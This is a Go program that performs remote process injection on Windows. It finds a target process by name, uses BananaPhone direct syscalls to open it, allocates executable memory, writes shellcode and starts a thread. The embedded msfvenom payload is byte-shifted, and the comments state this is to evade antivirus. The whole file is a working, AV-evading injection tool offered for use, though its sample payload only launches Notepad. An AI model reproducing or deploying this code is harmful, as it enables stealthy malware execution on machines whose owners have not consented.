package main

import (
	"fmt"
	"github.com/TheTitanrain/w32"
	"golang.org/x/sys/windows"
	"os"
	"time"
	"unsafe"

	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
)

type clientID struct {
	UniqueProcess uintptr
	UniqueThread  uintptr
}

type objectAttrs struct {
	Length                   uintptr
	RootDirectory            uintptr
	ObjectName               uintptr
	Attributes               uintptr
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

func getprocname(id uint32) string {
	snapshot := w32.CreateToolhelp32Snapshot(w32.TH32CS_SNAPMODULE, id)
	var me w32.MODULEENTRY32
	me.Size = uint32(unsafe.Sizeof(me))
	if w32.Module32First(snapshot, &me) {
		return w32.UTF16PtrToString(&me.SzModule[0])
	}
	return ""
}

func getpid(pname []string) uint32 {
	// enter target processes here, the more the better..
	//target_procs := []string{"notepad.exe", "OneDrive.exe", "explorer.exe"}
	target_procs := pname[1:]
	sz := uint32(1000)
	procs := make([]uint32, sz)
	var bytesReturned uint32
	for _,proc := range target_procs {
		if w32.EnumProcesses(procs, sz, &bytesReturned) {
			for _, pid := range procs[:int(bytesReturned)/4] {
				if getprocname(pid) == proc {
					return pid
				} else {
					// sleep to limit cpu usage
					time.Sleep(5 * time.Millisecond)
				}
			}
		}
	}
	return 0
}

func main() {
	//processName input
	if len(os.Args) < 2 {
		fmt.Fprintf(os.Stderr, "%s <pName>", os.Args[0])
		os.Exit(1)
	}
	targetPID := getpid(os.Args)

	// SecCommit is the SEC_COMMIT const from winnt.h
	const SecCommit = 0x08000000

	// SectionWrite is the SECTION_MAP_WRITE const from winnt.h
	const SectionWrite = 0x2

	// SectionRead is the SECTION_MAP_READ const from winnt.h
	const SectionRead = 0x4

	// SectionExecute is the SECTION_MAP_EXECUTE const from winnt.h
	const SectionExecute = 0x8

	// SectionRWX is the combination of READ, WRITE, and EXECUTE
	const SectionRWX = SectionWrite | SectionRead | SectionExecute

	// OpenProcess request access rights
	const requestRights = windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION |
		windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE |
		windows.PROCESS_VM_READ | windows.PROCESS_TERMINATE |
		windows.PROCESS_DUP_HANDLE | 0x001

	//Declare BananaPhone
	bp, e := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	if e != nil {
		panic(e)
	}
	a11oc, e := bp.GetSysID("NtAllocateVirtualMemory")
	if e != nil {
		panic(e)
	}
	create, e := bp.GetSysID("NtCreateThreadEx")
	if e != nil {
		panic(e)
	}
	write, e := bp.GetSysID("NtWriteVirtualMemory")
	if e != nil {
		panic(e)
	}
	ntopen, e := bp.GetSysID("NtOpenProcess")
	if e != nil {
		panic(e)
	}

	var (
		// Shellcode
		// msfvenom -p windows/x64/exec CMD=notepad.exe EXITFUNC=thread -f c
		// Payload size: 279 bytes
		// Shifted 10 bytes right to prevent AV detection of shellcode.
		shellcodeData = []byte("" +
			"\x06\x52\x8d\xee\xfa\xf2\xca\x0a\x0a\x0a\x4b\x5b\x4b\x5a\x5c\x5b\x60\x52\x3b\xdc" +
			"\x6f\x52\x95\x5c\x6a\x52\x95\x5c\x22\x52\x95\x5c\x2a\x52\x95\x7c\x5a\x52\x19\xc1" +
			"\x54\x54\x57\x3b\xd3\x52\x3b\xca\xb6\x46\x6b\x86\x0c\x36\x2a\x4b\xcb\xd3\x17\x4b" +
			"\x0b\xcb\xec\xf7\x5c\x4b\x5b\x52\x95\x5c\x2a\x95\x4c\x46\x52\x0b\xda\x95\x8a\x92" +
			"\x0a\x0a\x0a\x52\x8f\xca\x7e\x71\x52\x0b\xda\x5a\x95\x52\x22\x4e\x95\x4a\x2a\x53" +
			"\x0b\xda\xed\x60\x52\x09\xd3\x4b\x95\x3e\x92\x52\x0b\xe0\x57\x3b\xd3\x52\x3b\xca" +
			"\xb6\x4b\xcb\xd3\x17\x4b\x0b\xcb\x42\xea\x7f\xfb\x56\x0d\x56\x2e\x12\x4f\x43\xdb" +
			"\x7f\xe2\x62\x4e\x95\x4a\x2e\x53\x0b\xda\x70\x4b\x95\x16\x52\x4e\x95\x4a\x26\x53" +
			"\x0b\xda\x4b\x95\x0e\x92\x52\x0b\xda\x4b\x62\x4b\x62\x68\x63\x64\x4b\x62\x4b\x63" +
			"\x4b\x64\x52\x8d\xf6\x2a\x4b\x5c\x09\xea\x62\x4b\x63\x64\x52\x95\x1c\xf3\x61\x09" +
			"\x09\x09\x67\x52\xc4\x0b\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x52\x97\x97\x0b\x0b\x0a\x0a" +
			"\x4b\xc4\x3b\x95\x79\x91\x09\xdf\xc5\xea\x27\x34\x14\x4b\xc4\xb0\x9f\xc7\xa7\x09" +
			"\xdf\x52\x8d\xce\x32\x46\x10\x86\x14\x8a\x05\xea\x7f\x0f\xc5\x51\x1d\x7c\x79\x74" +
			"\x0a\x63\x4b\x93\xe4\x09\xdf\x78\x79\x7e\x6f\x7a\x6b\x6e\x38\x6f\x82\x6f\x0a",
		)

		// Declare some variables to collect the base address and the amount of bytes allocated.
		targetHandle windows.Handle
		baseAddress   uintptr
	)
	var allocatedSize = uint64(len(shellcodeData))

	// De-shift the code by 10.
	// Antivirus detects on the shellcode itself so this will bypass it.
	for i := range shellcodeData {
		shellcodeData[i] -= 10
	}

	if targetPID != 0 {
		//NtOpenProcess with banana
		r1, r := bananaphone.Syscall(
			ntopen,
			uintptr(unsafe.Pointer(&targetHandle)),
			requestRights,
			uintptr(unsafe.Pointer(&objectAttrs{0, 0, 0, 0, 0, 0})),
			uintptr(unsafe.Pointer(&clientID{uintptr(targetPID), 0})),
			0,
		)
		defer windows.CloseHandle(targetHandle)
		if r != nil {
			fmt.Printf("1 %s %x\n", r, r1)
			return
		}
		fmt.Printf("BananaPhone: Opened PID %d\n", targetPID)
	}else{
		fmt.Println("No Process! ")
		os.Exit(1)
	}

	//NtAllocateVirtualMemory
	r1, r := bananaphone.Syscall(
		a11oc, //NtAllocateVirtualMemory
		uintptr(targetHandle),
		uintptr(unsafe.Pointer(&baseAddress)),
		0,
		uintptr(unsafe.Pointer(&allocatedSize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if r != nil {
		fmt.Printf("2 %s %x\n", r, r1)
		return
	}
	fmt.Printf("BananaPhone: Allocated %dbytes at 0x%X\n", allocatedSize, baseAddress)

	//NtWriteVirtualMemory
	r1, r = bananaphone.Syscall(
		write, //NtWriteVirtualMemory
		uintptr(targetHandle),
		uintptr(baseAddress),
		uintptr(unsafe.Pointer(&shellcodeData[0])),
		uintptr(len(shellcodeData)),
		0,
	)
	if r != nil {
		fmt.Printf("3 %s %x\n", r, r1)
		return
	}

	fmt.Printf("BananaPhone: Wrote %dbytes at 0x%X\n", len(shellcodeData), baseAddress)

	// Declare a HANDLE to store the resulting thread HANDLE.
	var threadHandle uintptr

	//NtCreateThreadEx
	r1, r = bananaphone.Syscall(
		create,											//NtCreateThreadEx
		uintptr(unsafe.Pointer(&threadHandle)),			//hthread
		windows.GENERIC_EXECUTE,						//desiredaccess
		0,												//objattributes
		uintptr(targetHandle),							//processhandle
		baseAddress,									//lpstartaddress
		0,												//lpparam
		0,												//createsuspended
		0,												//zerobits
		0,												//sizeofstackcommit
		0,												//sizeofstackreserve
		0,												//lpbytesbuffer
	)
	if r != nil {
		fmt.Printf("4 %s %x\n", r, r1)
		return
	}
	fmt.Printf("BananaPhone: Execute 0x%X code at 0x%X\n", threadHandle, baseAddress)
}